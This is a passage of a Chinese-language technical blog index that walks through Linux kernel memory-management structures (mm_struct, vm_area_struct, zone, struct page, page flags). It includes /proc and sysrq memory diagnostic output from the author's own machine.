的内部，位于分配给 slab 的内存的第一个页框的起始位置。 12345678910111213struct slab &#123; union &#123; struct &#123; struct list_head list; unsigned long colouroff; // 第一个 obj 的着色 offset void *s_mem; // 第一个 obj 的地址包含着色 offset unsigned int inuse; // 当前被用的 obj 的数量 kmem_bufctl_t free; unsigned short nodeid; &#125;; struct slab_rcu __slab_cover_slab_rcu; &#125;;&#125;;","tags":["linux"]},{"title":"the virtual address of process","path":"/2016/11/17/virtual-memory-of-process/","content":"之前读 ULKe3 并没有配合最近版本的源码一起食用，导致理解不够深刻。后来又读了一遍 Linux kernel development，感觉虽然成文内容有点老，但是结构非常清晰，但是细节少。于是凭借着对 Linux kernel development 的理解又拿去 ULK 和 kernel 3.10 读了一遍，整理如下。 kernel task_struct 中 struct mm_struct *mm, *active_mm 是记录映射用户态地址空间的，结构体里面移除了一部分关于 numa 的字段，虽然 numa 是现代计算机非常重要的部分，但是引入了太多额外的细节对核心的理解有点干扰，还是移除了简单一点，有机会单独梳理一下 numa 吧。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192struct mm_struct &#123;\tstruct vm_area_struct * mmap; // 指向内存区域链表头部的指针\tstruct rb_root mm_rb; // 指向内存区域对象组织的红黑树的根节点\tstruct vm_area_struct * mmap_cache;\t// 指向最后一个内存区域对象#ifdef CONFIG_MMU\tunsigned long (*get_unmapped_area) (struct file *filp, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags);\tvoid (*unmap_area) (struct mm_struct *mm, unsigned long addr);#endif\tunsigned long mmap_base; // unsigned long task_size; /* size of task vm space */\tunsigned long cached_hole_size; /* if non-zero, the largest hole below free_area_cache */\tunsigned long free_area_cache; /* first hole of size cached_hole_size or larger */\tunsigned long highest_vm_end; /* highest vma end address */\tpgd_t * pgd;\tatomic_t mm_users; /* How many users with user space? */\tatomic_t mm_count; /* How many references to &quot;struct mm_struct&quot; (users count as 1) */\tint map_count; /* number of VMAs */\tspinlock_t page_table_lock; /* Protects page tables and some counters */\tstruct rw_semaphore mmap_sem;\tstruct list_head mmlist; /* List of maybe swapped mm&#x27;s.\tThese are globally strung * together off init_mm.mmlist, and are protected * by mmlist_lock */\tunsigned long hiwater_rss;\t/* High-watermark of RSS usage */\tunsigned long hiwater_vm;\t/* High-water virtual memory usage */\tunsigned long total_vm; /* Total pages mapped */\tunsigned long locked_vm;\t/* Pages that have PG_mlocked set */\tunsigned long pinned_vm;\t/* Refcount permanently increased */\tunsigned long shared_vm;\t/* Shared pages (files) */\tunsigned long exec_vm; /* VM_EXEC &amp; ~VM_WRITE */\tunsigned long stack_vm; /* VM_GROWSUP/DOWN */\tunsigned long def_flags;\tunsigned long nr_ptes; /* Page table pages */\tunsigned long start_code, end_code, start_data, end_data;\tunsigned long start_brk, brk, start_stack;\tunsigned long arg_start, arg_end, env_start, env_end;\tunsigned long saved_auxv[AT_VECTOR_SIZE]; /* for /proc/PID/auxv */\t/* * Special counters, in some configurations protected by the * page_table_lock, in other configurations by being atomic. */\tstruct mm_rss_stat rss_stat;\tstruct linux_binfmt *binfmt;\tcpumask_var_t cpu_vm_mask_var;\t/* Architecture-specific MM context */\tmm_context_t context;\tunsigned long flags; /* Must use atomic bitops to access the bits */\tstruct core_state *core_state; /* coredumping support */#ifdef CONFIG_AIO\tspinlock_t ioctx_lock;\tstruct hlist_head\tioctx_list;#endif#ifdef CONFIG_MM_OWNER\t/* * &quot;owner&quot; points to a task that is regarded as the canonical * user/owner of this mm. All of the following must be true in * order for it to be changed: * * current == mm-&gt;owner * current-&gt;mm != mm * new_owner-&gt;mm == mm * new_owner-&gt;alloc_lock is held */\tstruct task_struct __rcu *owner;#endif\t/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */\tstruct file *exe_file;...#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tpgtable_t pmd_huge_pte; /* protected by page_table_lock */#endif#ifdef CONFIG_CPUMASK_OFFSTACK\tstruct cpumask cpumask_allocation;#endif...\tstruct uprobes_state uprobes_state;&#125;; This struct defines a memory VMM memory area. There is one of these per VM-area&#x2F;task. A VM area is any part of the process virtual memory space that has a special rule for the page-fault handlers (ie a shared library, the executable area etc). 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162struct vm_area_struct &#123;\t/* The first cache line has the info for VMA tree walking. */\tunsigned long vm_start; /* Our start address within vm_mm. */\tunsigned long vm_end; /* The first byte after our end address within vm_mm. */\t/* linked list of VM areas per task, sorted by address */\tstruct vm_area_struct *vm_next, *vm_prev;\tstruct rb_node vm_rb;\t/* * Largest free memory gap in bytes to the left of this VMA. * Either between this VMA and vma-&gt;vm_prev, or between one of the * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps * get_unmapped_area find a free area of the right size. */\tunsigned long rb_subtree_gap;\t/* Second cache line starts here. */\tstruct mm_struct *vm_mm;\t/* The address space we belong to. */\tpgprot_t vm_page_prot; /* Access permissions of this VMA. */\tunsigned long vm_flags; /* Flags, see mm.h. */\t/* * For areas with an address space and backing store, * linkage into the address_space-&gt;i_mmap interval tree, or * linkage of vma in the address_space-&gt;i_mmap_nonlinear list. */\tunion &#123; struct &#123; struct rb_node rb; unsigned long rb_subtree_last; &#125; linear; struct list_head nonlinear;\t&#125; shared;\t/* * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma * list, after a COW of one of the file pages.\tA MAP_SHARED vma * can only be in the i_mmap tree. An anonymous MAP_PRIVATE, stack * or brk vma (with NULL file) can only be in an anon_vma list. */\tstruct list_head anon_vma_chain; /* Serialized by mmap_sem &amp; * page_table_lock */\tstruct anon_vma *anon_vma;\t/* Serialized by page_table_lock */\t/* Function pointers to deal with this struct. */\tconst struct vm_operations_struct *vm_ops;\t/* Information about our backing store: */\tunsigned long vm_pgoff; /* Offset (within vm_file) in PAGE_SIZE units, *not* PAGE_CACHE_SIZE */\tstruct file * vm_file; /* File we map to (can be NULL). */\tvoid * vm_private_data; /* was vm_pte (shared mem) */#ifndef CONFIG_MMU\tstruct vm_region *vm_region;\t/* NOMMU mapping region */#endif&#125;; These are the virtual MM functions - opening of an area, closing and unmapping it (needed to keep files on disk up-to-date etc), pointer to the functions called when a no-page or a wp-page exception occurs. 12345678910111213141516171819struct vm_operations_struct &#123;\tvoid (*open)(struct vm_area_struct * area);\tvoid (*close)(struct vm_area_struct * area);\tint (*fault)(struct vm_area_struct *vma, struct vm_fault *vmf);\t/* notification that a previously read-only page is about to become * writable, if an error is returned it will cause a SIGBUS */\tint (*page_mkwrite)(struct vm_area_struct *vma, struct vm_fault *vmf);\t/* called by access_process_vm when get_user_pages() fails, typically * for use by special VMAs that can switch between memory and hardware */\tint (*access)(struct vm_area_struct *vma, unsigned long addr, void *buf, int len, int write);...\t/* called by sys_remap_file_pages() to populate non-linear mapping */\tint (*remap_pages)(struct vm_area_struct *vma, unsigned long addr, unsigned long size, pgoff_t pgoff);&#125;;","tags":["linux"]},{"title":"the organization of linux physical memory","path":"/2016/11/15/the-organization-of-kernel-physical-memory/","content":"梳理一下 Linux 物理内存的组织，有了这个铺垫可以快速什么页框回收，KSM(kernel samepage merging)，cgroup mm 是在内存那个层面玩的，能玩出什么花样，还能玩出什么花样。 现代的 Linux 都是支持 NUMA，它和普通的 SMP 机器区别在于同一个 cpu 访问不同的地址的时间开销可能不一样，所以叫不一致。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/* * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM * (mostly NUMA machines?) to denote a higher-level memory zone than the * zone denotes. * * On NUMA machines, each NUMA node would have a pg_data_t to describe * it&#x27;s memory layout. * * Memory statistics and page replacement data structures are maintained on a * per-zone basis. */struct bootmem_data;typedef struct pglist_data &#123; struct zone node_zones[MAX_NR_ZONES]; struct zonelist node_zonelists[MAX_ZONELISTS]; int nr_zones;#ifdef CONFIG_FLAT_NODE_MEM_MAP /* means !SPARSEMEM */ struct page *node_mem_map;#ifdef CONFIG_MEMCG struct page_cgroup *node_page_cgroup;#endif#endif#ifndef CONFIG_NO_BOOTMEM struct bootmem_data *bdata;#endif#ifdef CONFIG_MEMORY_HOTPLUG /* * Must be held any time you expect node_start_pfn, node_present_pages * or node_spanned_pages stay constant. Holding this will also * guarantee that any pfn_valid() stays that way. * * Nests above zone-&gt;lock and zone-&gt;size_seqlock. */ spinlock_t node_size_lock;#endif unsigned long node_start_pfn; unsigned long node_present_pages; /* total number of physical pages */ unsigned long node_spanned_pages; /* total size of physical page range, including holes */ int node_id; nodemask_t reclaim_nodes; /* Nodes allowed to reclaim from */ wait_queue_head_t kswapd_wait; wait_queue_head_t pfmemalloc_wait; struct task_struct *kswapd; /* Protected by lock_memory_hotplug() */ int kswapd_max_order; enum zone_type classzone_idx;#ifdef CONFIG_NUMA_BALANCING /* * Lock serializing the per destination node AutoNUMA memory * migration rate limiting data. */ spinlock_t numabalancing_migrate_lock; /* Rate limiting time interval */ unsigned long numabalancing_migrate_next_window; /* Number of pages migrated during the rate limiting time interval */ unsigned long numabalancing_migrate_nr_pages;#endif&#125; pg_data_t; 每一个 node 下面又分为几个 zone，可以看到伙伴系统是在 zone 里面玩的，内存回收也是在 zone 里面玩的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178struct zone &#123;\t/* Fields commonly accessed by the page allocator */\t/* zone watermarks, access with *_wmark_pages(zone) macros */\tunsigned long watermark[NR_WMARK];\t/* * When free pages are below this point, additional steps are taken * when reading the number of free pages to avoid per-cpu counter * drift allowing watermarks to be breached */\tunsigned long percpu_drift_mark;\t/* * We don&#x27;t know if the memory that we&#x27;re going to allocate will be freeable * or/and it will be released eventually, so to avoid totally wasting several * GB of ram we must reserve some of the lower zone memory (otherwise we risk * to run OOM on the lower zones despite there&#x27;s tons of freeable ram * on the higher zones). This array is recalculated at runtime if the * sysctl_lowmem_reserve_ratio sysctl changes. */\tunsigned long lowmem_reserve[MAX_NR_ZONES];\t/* * This is a per-zone reserve of pages that should not be * considered dirtyable memory. */\tunsigned long dirty_balance_reserve;#ifdef CONFIG_NUMA\tint node;\t/* * zone reclaim becomes active if more unmapped pages exist. */\tunsigned long min_unmapped_pages;\tunsigned long min_slab_pages;#endif\tstruct per_cpu_pageset __percpu *pageset;\t/* * free areas of different sizes */\tspinlock_t lock;\tint all_unreclaimable; /* All pages pinned */#if defined CONFIG_COMPACTION || defined CONFIG_CMA\t/* Set to true when the PG_migrate_skip bits should be cleared */\tbool compact_blockskip_flush;\t/* pfns where compaction scanners should start */\tunsigned long compact_cached_free_pfn;\tunsigned long compact_cached_migrate_pfn;#endif#ifdef CONFIG_MEMORY_HOTPLUG\t/* see spanned/present_pages for more description */\tseqlock_t span_seqlock;#endif\tstruct free_area\tfree_area[MAX_ORDER];#ifndef CONFIG_SPARSEMEM\t/* * Flags for a pageblock_nr_pages block. See pageblock-flags.h. * In SPARSEMEM, this map is stored in struct mem_section */\tunsigned long *pageblock_flags;#endif /* CONFIG_SPARSEMEM */#ifdef CONFIG_COMPACTION\t/* * On compaction failure, 1&lt;&lt;compact_defer_shift compactions * are skipped before trying again. The number attempted since * last failure is tracked with compact_considered. */\tunsigned int compact_considered;\tunsigned int compact_defer_shift;\tint compact_order_failed;#endif\tZONE_PADDING(_pad1_)\t/* Fields commonly accessed by the page reclaim scanner */\tspinlock_t lru_lock;\tstruct lruvec lruvec;\tunsigned long pages_scanned; /* since last reclaim */\tunsigned long flags; /* zone flags, see below */\t/* Zone statistics */\tatomic_long_t vm_stat[NR_VM_ZONE_STAT_ITEMS];\t/* * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on * this zone&#x27;s LRU. Maintained by the pageout code. */\tunsigned int inactive_ratio;\tZONE_PADDING(_pad2_)\t/* Rarely used or read-mostly fields */\t/* * wait_table -- the array holding the hash table * wait_table_hash_nr_entries\t-- the size of the hash table array * wait_table_bits\t-- wait_table_size == (1 &lt;&lt; wait_table_bits) * * The purpose of all these is to keep track of the people * waiting for a page to become available and make them * runnable again when possible. The trouble is that this * consumes a lot of space, especially when so few things * wait on pages at a given time. So instead of using * per-page waitqueues, we use a waitqueue hash table. * * The bucket discipline is to sleep on the same queue when * colliding and wake all in that wait queue when removing. * When something wakes, it must check to be sure its page is * truly available, a la thundering herd. The cost of a * collision is great, but given the expected load of the * table, they should be so rare as to be outweighed by the * benefits from the saved space. * * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the * primary users of these fields, and in mm/page_alloc.c * free_area_init_core() performs the initialization of them. */\twait_queue_head_t\t* wait_table;\tunsigned long wait_table_hash_nr_entries;\tunsigned long wait_table_bits;\t/* * Discontig memory support fields. */\tstruct pglist_data\t*zone_pgdat;\t/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */\tunsigned long zone_start_pfn;\t/* * spanned_pages is the total pages spanned by the zone, including * holes, which is calculated as: * spanned_pages = zone_end_pfn - zone_start_pfn; * * present_pages is physical pages existing within the zone, which * is calculated as: *\tpresent_pages = spanned_pages - absent_pages(pages in holes); * * managed_pages is present pages managed by the buddy system, which * is calculated as (reserved_pages includes pages allocated by the * bootmem allocator): *\tmanaged_pages = present_pages - reserved_pages; * * So present_pages may be used by memory hotplug or memory power * management logic to figure out unmanaged pages by checking * (present_pages - managed_pages). And managed_pages should be used * by page allocator and vm scanner to calculate all kinds of watermarks * and thresholds. * * Locking rules: * * zone_start_pfn and spanned_pages are protected by span_seqlock. * It is a seqlock because it has to be read outside of zone-&gt;lock, * and it is done in the main allocator path. But, it is written * quite infrequently. * * The span_seq lock is declared along with zone-&gt;lock because it is * frequently read in proximity to zone-&gt;lock. It&#x27;s good to * give them a chance of being in the same cacheline. * * Write access to present_pages and managed_pages at runtime should * be protected by lock_memory_hotplug()/unlock_memory_hotplug(). * Any reader who can&#x27;t tolerant drift of present_pages and * managed_pages should hold memory hotplug lock to get a stable value. */\tunsigned long spanned_pages;\tunsigned long present_pages;\tunsigned long managed_pages;\t/* * rarely used fields: */\tconst char *name;&#125; ____cacheline_internodealigned_in_smp; 配合着猜和注释以及命名还是能理解个大概的，不过有个细节是开发者 控制代码生成而添加的 ____cacheline_internodealigned_in_smp其实还是非常值得说到，放在这里的意思就是”避免每个 CPU 在对属于自己的那个 map 读写时造成 false sharing”，实现是生产新的 section： .data..cacheline_aligned，而后交给 kernel linker 脚本处理，一般说明这是个多处理器体系结构下的关键数据结构。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950enum zone_type &#123;#ifdef CONFIG_ZONE_DMA /* * ZONE_DMA is used when there are devices that are not able * to do DMA to all of addressable memory (ZONE_NORMAL). Then we * carve out the portion of memory that is needed for these devices. * The range is arch specific. * * Some examples * * Architecture Limit * --------------------------- * parisc, ia64, sparc &lt;4G * s390 &lt;2G * arm Various * alpha Unlimited or 0-16MB. * * i386, x86_64 and multiple other arches * &lt;16M. */ ZONE_DMA,#endif#ifdef CONFIG_ZONE_DMA32 /* * x86_64 needs two ZONE_DMAs because it supports devices that are * only able to do DMA to the lower 16M but also 32 bit devices that * can only do DMA areas below 4G. */ ZONE_DMA32,#endif /* * Normal addressable memory is in ZONE_NORMAL. DMA operations can be * performed on pages in ZONE_NORMAL if the DMA devices support * transfers to all addressable memory. */ ZONE_NORMAL,#ifdef CONFIG_HIGHMEM /* * A memory area that is only addressable by the kernel through * mapping portions into its own address space. This is for example * used by i386 to allow the kernel to address the memory beyond * 900MB. The kernel will set up special mappings (page * table entries on i386) for each page that the kernel needs to * access. */ ZONE_HIGHMEM,#endif ZONE_MOVABLE, __MAX_NR_ZONES&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153/* * Each physical page in the system has a struct page associated with * it to keep track of whatever it is we are using the page for at the * moment. Note that we have no way to track which tasks are using * a page, though if it is a pagecache page, rmap structures can tell us * who is mapping it. * * The objects in struct page are organized in double word blocks in * order to allows us to use atomic double word operations on portions * of struct page. That is currently only used by slub but the arrangement * allows the use of atomic double word operations on the flags/mapping * and lru list pointers also. */struct page &#123;\t/* First double word block */\tunsigned long flags; /* Atomic flags, some possibly * updated asynchronously */\tstruct address_space *mapping;\t/* If low bit clear, points to * inode address_space, or NULL. * If page mapped as anonymous * memory, low bit is set, and * it points to anon_vma object: * see PAGE_MAPPING_ANON below. */\t/* Second double word */\tstruct &#123; union &#123; pgoff_t index; /* Our offset within mapping. */ void *freelist; /* slub/slob first free object */ bool pfmemalloc;\t/* If set by the page allocator, * ALLOC_NO_WATERMARKS was set * and the low watermark was not * met implying that the system * is under some pressure. The * caller should try ensure * this page is only used to * free other pages. */ &#125;; union &#123;#if defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \\\tdefined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE) /* Used for cmpxchg_double in slub */ unsigned long counters;#else /* * Keep _count separate from slub cmpxchg_double data. * As the rest of the double word is protected by * slab_lock but _count is not. */ unsigned counters;#endif struct &#123; union &#123; /* * Count of ptes mapped in * mms, to show when page is * mapped &amp; limit reverse map * searches. * * Used also for tail pages * refcounting instead of * _count. Tail pages cannot * be mapped and keeping the * tail page _count zero at * all times guarantees * get_page_unless_zero() will * never succeed on tail * pages. */ atomic_t _mapcount; struct &#123; /* SLUB */ unsigned inuse:16; unsigned objects:15; unsigned frozen:1; &#125;; int units;\t/* SLOB */ &#125;; atomic_t _count; /* Usage count, see below. */ &#125;; &#125;;\t&#125;;\t/* Third double word block */\tunion &#123; struct list_head lru;\t/* Pageout list, eg. active_list * protected by zone-&gt;lru_lock ! */ struct &#123; /* slub per cpu partial pages */ struct page *next;\t/* Next partial slab */#ifdef CONFIG_64BIT int pages;\t/* Nr of partial slabs left */ int pobjects;\t/* Approximate # of objects */#else short int pages; short int pobjects;#endif &#125;; struct list_head list;\t/* slobs list of pages */ struct slab *slab_page; /* slab fields */\t&#125;;\t/* Remainder is not double word aligned */\tunion &#123; unsigned long private; /* Mapping-private opaque data: * usually used for buffer_heads * if PagePrivate set; used for * swp_entry_t if PageSwapCache; * indicates order in the buddy * system if PG_buddy is set. */#if USE_SPLIT_PTLOCKS spinlock_t ptl;#endif struct kmem_cache *slab_cache;\t/* SL[AU]B: Pointer to slab */ struct page *first_page;\t/* Compound tail pages */\t&#125;;\t/* * On machines where all RAM is mapped into kernel address space, * we can simply calculate the virtual address. On machines with * highmem some memory is mapped into kernel virtual memory * dynamically, so we need a place to store that address. * Note that this field could be 16 bits on x86 ... ;) * * Architectures with slow multiplication can define * WANT_PAGE_VIRTUAL in asm/page.h */#if defined(WANT_PAGE_VIRTUAL)\tvoid *virtual; /* Kernel virtual address (NULL if not kmapped, ie. highmem) */#endif /* WANT_PAGE_VIRTUAL */#ifdef CONFIG_WANT_PAGE_DEBUG_FLAGS\tunsigned long debug_flags;\t/* Use atomic bitops on this */#endif#ifdef CONFIG_KMEMCHECK\t/* * kmemcheck wants to track the status of each byte in a page; this * is a pointer to such a status block. NULL if not tracked. */\tvoid *shadow;#endif#ifdef LAST_NID_NOT_IN_PAGE_FLAGS\tint _last_nid;#endif&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/* * Various page-&gt;flags bits: * * PG_reserved is set for special pages, which can never be swapped out. Some * of them might not even exist (eg empty_bad_page)... * * The PG_private bitflag is set on pagecache pages if they contain filesystem * specific data (which is normally at page-&gt;private). It can be used by * private allocations for its own usage. * * During initiation of disk I/O, PG_locked is set. This bit is set before I/O * and cleared when writeback _starts_ or when read _completes_. PG_writeback * is set before writeback starts and cleared when it finishes. * * PG_locked also pins a page in pagecache, and blocks truncation of the file * while it is held. * * page_waitqueue(page) is a wait queue of all tasks waiting for the page * to become unlocked. * * PG_uptodate tells whether the page&#x27;s contents is valid. When a read * completes, the page becomes uptodate, unless a disk I/O error happened. * * PG_referenced, PG_reclaim are used for page reclaim for anonymous and * file-backed pagecache (see mm/vmscan.c). * * PG_error is set to indicate that an I/O error occurred on this page. * * PG_arch_1 is an architecture specific page state bit. The generic code * guarantees that this bit is cleared for a page when it first is entered into * the page cache. * * PG_highmem pages are not permanently mapped into the kernel virtual address * space, they need to be kmapped separately for doing IO on the pages. The * struct page (these bits with information) are always mapped into kernel * address space... * * PG_hwpoison indicates that a page got corrupted in hardware and contains * data with incorrect ECC bits that triggered a machine check. Accessing is * not safe since it may cause another machine check. Don&#x27;t touch! *//* * Don&#x27;t use the *_dontuse flags. Use the macros. Otherwise you&#x27;ll break * locked- and dirty-page accounting. * * The page flags field is split into two parts, the main flags area * which extends from the low bits upwards, and the fields area which * extends from the high bits downwards. * * | FIELD | ... | FLAGS | * N-1 ^ 0 * (NR_PAGEFLAGS) * * The fields area is reserved for fields mapping zone, node (for NUMA) and * SPARSEMEM section (for variants of SPARSEMEM that require section ids like * SPARSEMEM_EXTREME with !SPARSEMEM_VMEMMAP). */enum pageflags &#123;\tPG_locked, /* Page is locked. Don&#x27;t touch. */\tPG_error,\tPG_referenced,\tPG_uptodate,\tPG_dirty,\tPG_lru,\tPG_active,\tPG_slab,\tPG_owner_priv_1,\t/* Owner use. If pagecache, fs may use*/\tPG_arch_1,\tPG_reserved,\tPG_private, /* If pagecache, has fs-private data */\tPG_private_2, /* If pagecache, has fs aux data */\tPG_writeback, /* Page is under writeback */#ifdef CONFIG_PAGEFLAGS_EXTENDED\tPG_head, /* A head page */\tPG_tail, /* A tail page */#else\tPG_compound, /* A compound page */#endif\tPG_swapcache, /* Swap page: swp_entry_t in private */\tPG_mappedtodisk,\t/* Has blocks allocated on-disk */\tPG_reclaim, /* To be reclaimed asap */\tPG_swapbacked, /* Page is backed by RAM/swap */\tPG_unevictable, /* Page is &quot;unevictable&quot; */#ifdef CONFIG_MMU\tPG_mlocked, /* Page is vma mlocked */#endif#ifdef CONFIG_ARCH_USES_PG_UNCACHED\tPG_uncached, /* Page has been mapped as uncached */#endif#ifdef CONFIG_MEMORY_FAILURE\tPG_hwpoison, /* hardware poisoned page. Don&#x27;t touch */#endif#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tPG_compound_lock,#endif\t__NR_PAGEFLAGS,\t/* Filesystems */\tPG_checked = PG_owner_priv_1,\t/* Two page bits are conscripted by FS-Cache to maintain local caching * state. These bits are set on pages belonging to the netfs&#x27;s inodes * when those inodes are being locally cached. */\tPG_fscache = PG_private_2,\t/* page backed by cache */\t/* XEN */\tPG_pinned = PG_owner_priv_1,\tPG_savepinned = PG_dirty,\t/* SLOB */\tPG_slob_free = PG_private,&#125;; debug 1234567891011121314151617181920212223242526272829localhost linux (f722406faae2*) # cat /proc/zoneinfoNode 0, zone DMA per-node stats nr_inactive_anon 736 nr_active_anon 72656 nr_inactive_file 75051 nr_active_file 27954 nr_unevictable 0 nr_isolated_anon 0 nr_isolated_file 0 workingset_refault 0 workingset_activate 0 workingset_nodereclaim 0 nr_anon_pages 72428 nr_mapped 38197 nr_file_pages 103951 nr_dirty 0 nr_writeback 0 nr_writeback_temp 0 nr_shmem 946 nr_shmem_hugepages 0 nr_shmem_pmdmapped 0 nr_anon_transparent_hugepages 0 nr_unstable 0 nr_vmscan_write 0 nr_vmscan_immediate_reclaim 0 nr_dirtied 12449 nr_written 11323 ... 12345678910111213141516171819202122232425262728localhost linux (f722406faae2*) # cat /proc/pagetypeinfoPage block order: 9Pages per block: 512Free pages count per migrate type at order 0 1 2 3 4 5 6 7 8 9 10Node 0, zone DMA, type Unmovable 0 0 0 0 2 1 1 0 1 0 0Node 0, zone DMA, type Movable 0 0 0 0 0 0 0 0 0 1 3Node 0, zone DMA, type Reclaimable 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA, type Isolate 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type Unmovable 115 39 6 0 0 0 0 0 0 1 0Node 0, zone DMA32, type Movable 109 182 149 59 17 1 1 0 0 1 675Node 0, zone DMA32, type Reclaimable 1 0 0 1 1 1 0 0 1 1 0Node 0, zone DMA32, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone DMA32, type Isolate 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type Unmovable 31 6 4 5 2 2 0 0 1 1 0Node 0, zone Normal, type Movable 10 3 1 3 1 1 1 0 0 0 4Node 0, zone Normal, type Reclaimable 0 1 2 1 2 1 0 0 0 0 0Node 0, zone Normal, type HighAtomic 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type CMA 0 0 0 0 0 0 0 0 0 0 0Node 0, zone Normal, type Isolate 0 0 0 0 0 0 0 0 0 0 0Number of blocks type Unmovable Movable Reclaimable HighAtomic CMA IsolateNode 0, zone DMA 1 7 0 0 0 0Node 0, zone DMA32 6 1518 4 0 0 0Node 0, zone Normal 102 336 74 0 0 0 1234567891011121314151617181920212223242526272829303132localhost linux (f722406faae2*) # cat /sys/devices/system/node/node*/meminfoNode 0 MemTotal: 3893860 kBNode 0 MemFree: 2816460 kBNode 0 MemUsed: 1077400 kBNode 0 Active: 402968 kBNode 0 Inactive: 303324 kBNode 0 Active(anon): 291136 kBNode 0 Inactive(anon): 2944 kBNode 0 Active(file): 111832 kBNode 0 Inactive(file): 300380 kBNode 0 Unevictable: 0 kBNode 0 Mlocked: 0 kBNode 0 Dirty: 4 kBNode 0 Writeback: 0 kBNode 0 FilePages: 415996 kBNode 0 Mapped: 152788 kBNode 0 AnonPages: 290224 kBNode 0 Shmem: 3784 kBNode 0 KernelStack: 5232 kBNode 0 PageTables: 10648 kBNode 0 NFS_Unstable: 0 kBNode 0 Bounce: 0 kBNode 0 WritebackTmp: 0 kBNode 0 Slab: 207012 kBNode 0 SReclaimable: 155908 kBNode 0 SUnreclaim: 51104 kBNode 0 AnonHugePages: 0 kBNode 0 ShmemHugePages: 0 kBNode 0 ShmemPmdMapped: 0 kBNode 0 HugePages_Total: 0Node 0 HugePages_Free: 0Node 0 HugePages_Surp: 0 123456789101112131415161718192021222324252627282930313233localhost linux (f722406faae2*) # echo 1 &gt; /proc/sys/kernel/sysrqlocalhost linux (f722406faae2*) # echo m &gt; /proc/sysrq-triggerlocalhost linux (f722406faae2*) # dmesg[ 6392.495199] sysrq: SysRq : Show Memory[ 6392.495830] Mem-Info:[ 6392.495837] active_anon:72784 inactive_anon:736 isolated_anon:0 active_file:27975 inactive_file:75079 isolated_file:0 unevictable:0 dirty:0 writeback:0 unstable:0 slab_reclaimable:39027 slab_unreclaimable:12767 mapped:38197 shmem:946 pagetables:2662 bounce:0 free:704008 free_pcp:1316 free_cma:0[ 6392.495840] Node 0 active_anon:291136kB inactive_anon:2944kB active_file:111900kB inactive_file:300316kB unevictable:0kB isolated(anon):0kB isolated(file):0kB mapped:152788kB dirty:0kB writeback:0kB shmem:3784kB shmem_thp: 0kB shmem_pmdmapped: 0kB anon_thp: 0kB writeback_tmp:0kB unstable:0kB all_unreclaimable? no[ 6392.495841] Node 0 DMA free:15872kB min:276kB low:344kB high:412kB active_anon:0kB inactive_anon:0kB active_file:0kB inactive_file:0kB unevictable:0kB writepending:0kB present:15988kB managed:15904kB mlocked:0kB slab_reclaimable:0kB slab_unreclaimable:32kB kernel_stack:0kB pagetables:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB[ 6392.495845] lowmem_reserve[]: 0 2823 3763 3763 3763[ 6392.495848] Node 0 DMA32 free:2779228kB min:50496kB low:63120kB high:75744kB active_anon:94688kB inactive_anon:12kB active_file:2268kB inactive_file:22864kB unevictable:0kB writepending:0kB present:3129152kB managed:2915512kB mlocked:0kB slab_reclaimable:4972kB slab_unreclaimable:4416kB kernel_stack:640kB pagetables:1248kB bounce:0kB free_pcp:2624kB local_pcp:668kB free_cma:0kB[ 6392.495852] lowmem_reserve[]: 0 0 939 939 939[ 6392.495854] Node 0 Normal free:20932kB min:16808kB low:21008kB high:25208kB active_anon:196448kB inactive_anon:2932kB active_file:109632kB inactive_file:277452kB unevictable:0kB writepending:0kB present:1048576kB managed:962444kB mlocked:0kB slab_reclaimable:151136kB slab_unreclaimable:46620kB kernel_stack:4592kB pagetables:9400kB bounce:0kB free_pcp:2640kB local_pcp:664kB free_cma:0kB[ 6392.495858] lowmem_reserve[]: 0 0 0 0 0[ 6392.495860] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 2*64kB (U) 1*128kB (U) 1*256kB (U) 0*512kB 1*1024kB (U) 1*2048kB (M) 3*4096kB (M) = 15872kB[ 6392.495881] Node 0 DMA32: 345*4kB (UME) 285*8kB (UM) 189*16kB (UME) 32*32kB (UM) 1*64kB (M) 2*128kB (UE) 1*256kB (U) 2*512kB (UM) 3*1024kB (UME) 1*2048kB (E) 675*4096kB (M) = 2779228kB[ 6392.495893] Node 0 Normal: 21*4kB (M) 4*8kB (UM) 3*16kB (UME) 5*32kB (UME) 4*64kB (UME) 3*128kB (UM) 2*256kB (ME) 0*512kB 1*1024kB (U) 1*2048kB (U) 4*4096kB (M) = 20932kB[ 6392.495905] Node 0 hugepages_total=0 hugepages_free=0 